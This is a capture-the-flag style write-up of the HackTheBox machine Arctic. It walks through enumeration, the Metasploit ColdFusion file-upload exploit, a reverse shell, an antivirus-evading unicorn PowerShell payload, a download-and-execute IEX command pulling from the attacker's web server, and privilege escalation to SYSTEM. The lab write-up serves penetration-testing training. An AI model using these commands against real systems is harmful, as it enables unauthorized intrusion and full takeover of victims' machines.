---
published: true
---
Disassembly of ippsec’s youtube video HackTheBox - Arctic. Focus on Windows and basic enumeration, intercepting an application communications via burp. Shell creation with Unicorn and powershell usage along with windows enumeration.

----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557378912965_image.png)

This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.

# Enumeration
nmap scan:

    nmap -sV -sC -oA nmap 10.10.10.11

(results)

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379064999_image.png)

Port 135 = Windows RPC
Port 8500 = doesn’t know what it is
Port 49154 = Windows RPC

## investigate 8500

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379202857_image.png)

*page takes a significant amount of time to load possibly why the name Arctic.*

exploring paths `/CFIDE`

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379266380_image.png)

*an “administrator” page is found.*
`administrator/`

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379302806_image.png)

*if page loads correct should say Cold Fusion 8*

## searchploit
    searchsploit coldfusion

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379408282_image.png)

*we have results pointing to the version 8.x.x but are cross site scripting. But there is* 

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379451640_image.png)

*which is a metasploit file upload, a possible way to get a foothold into the box.*

## metasploit
    msfconsole
    search coldfusion

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379531674_image.png)

`exploit/windows/http/coldfusion_fckeditor` *looks like the same exploit from the searchsploit.*

    use exploit/windows/http/coldfusion_fckeditor
    show options
    set RHOST 10.10.10.11
    set RPORT 8500
    run

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379675450_image.png)

*almost immediately fails due to the response time that needs to be adjusted in metasploit.*

Modify advanced options

    advanced options
    set VERBOSE true # to see the output
    run

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379781534_image.png)

*hoping to see a POST request and a server response.*

If the module doesn’t support a proxy script we can push the module/communications to burp:

## setup burp to intercept application
proxy tab > options > add proxy listeners
 
![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379964398_image.png)

*bind to 8500*

Request Handling:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557379995472_image.png)

tick box for running:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557380031734_image.png)

go to web browser `localhost:8500`

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557380224050_image.png)

*every time we connect to 8500 we get redirected to 10.10.10.11:8500*

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381550249_image.png)

Turn intercept on:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381578955_image.png)

In metasploit:

    set RHOST 127.0.0.1

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381621297_image.png)

*and at this point we are now redirecting through burp (forward first request) then:*

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381682567_image.png)


*see the request metasploit is trying to make. Next send to repeater and send:*

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381755532_image.png)

*how this exploit works is that the Post request is sent to CurrentFolder and a .jsp file is added but with a %00 null byte at the end which confuses the web-server and allows for the file to upload.*

Finished 200 response:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381841441_image.png)

*Futhermore, the script is going to try to open a connection to our local box on port 4444 thus we need to have a listener setup to catch the connection.*

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557381988409_image.png)

## setup listener
    ncat -lvnp 4444

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382032654_image.png)

navigate to the k.jsp page

    10.10.10.11:8500/userfiles/file/K.jsp

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382099333_image.png)

*wait the 20-30s for the connection to establish.*

# Reverse Shell - RCE
a connection is established via the K.jsp file to port 4444:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382176309_image.png)

*this is just a reverse shell and we need to upgrade it.*

## unicorn to upgrade shell

Github Link: https://github.com/trustedsec/unicorn

    /opt/unicorn/unicorn.py

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382355291_image.png)

usage:

    /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 10.10.12.194 31337

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382483702_image.png)

*output’s two files when it’s done.* 

First file: unicorn.rc - all commands to load unicorn in metasploit
Second file: powershell_attack.txt = unicorn powershell exploit


![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382554455_image.png)

    cat powershell_attack.txt

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382593808_image.png)

*command is very long but can return a shell. Sending this all through one terminal might not be the best call the better option would be to have the file sent to target.*

## load metasploit w/ unicorn command
    msfconsole -r unicorn.rc

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382723977_image.png)

## create powershell_attack to html

create a new file with a pasted clipboad of the exploit and named it `exploit.html`

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382869041_image.png)

*delete the double quote in the beginning and the end of the powershell script to have a pure version of it. Now we have a script that has been obfuscated to evade antivirus.* 

setup local SimpleHTTPServer

    python -m SimpleHTTPServer

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557382981791_image.png)

On target shell:

    powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.194:8000/exploit.html')"

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557383084773_image.png)

box hits the web-server:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557383116068_image.png)

Meterpreter Shell:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557383168371_image.png)

*firstly, check the sysinfo to see architecture and the meterpreter session is in a 32bit session.*

## enumerate windows
    getuid

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557385526491_image.png)

search suggest - checks KBs on box and recommended exploits

    search suggest

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557385966485_image.png)

    use post/multi/recon/local_exploit_suggester
    show options
    set SESSION 1
    run

*first ran in a 32bit bit process and then migrate to a x64 as different exploits become available. Run PowerUp.ps1 if nothing returns.*
(results)

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386174495_image.png)

*save results as a copy locally.*

## migrate to 64bit
Meterpreter:

    ps # list processes

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386516099_image.png)

*Looking for a process with an x64 and a 1 as that means its interactive and there is more leverage on the things it has the ability to do. None in this case.*

migrate to conhost:

    migrate 1120

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386626024_image.png)

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386652787_image.png)

Run “sysinfo” to verify were on a x64 process:

    sysinfo

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386698860_image.png)

*confirmed x64, background with ctrl+z*
    show options # check for suggester
    run

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386790787_image.png)

*returns only one that appears to be vulnerable. Save to notes*

Compare notes:

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557386826514_image.png)

*ms10_092_schelevator reported on both architectures. Which should be a stong first to try.*

# Root&Loot
     use exploit/windows/local/ms10_092_schelevator
    show options
    set session 1
    run

 *in this scenairo it actually used a local 172. IP which was not intendted as so the set LHOST 10.10.12.194 was sent again and ran.*

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557387120875_image.png)

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557387142354_image.png)

*session 2 was successfully opened*

    getuid

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557387206166_image.png)

Achieved NT AUTHORITY\SYSTEM

## loot
    shell

![](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557387288607_image.png)

![#HAILippsec](https://paper-attachments.dropbox.com/s_70F45A0969F37A99ED1A657AF2E8D7B314564C871AC1961D0B84F468D38FDF75_1557388243988_image.png)

----------

If you don’t know who ippsec is check him out at:

Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA 
Twitter: https://twitter.com/ippsec

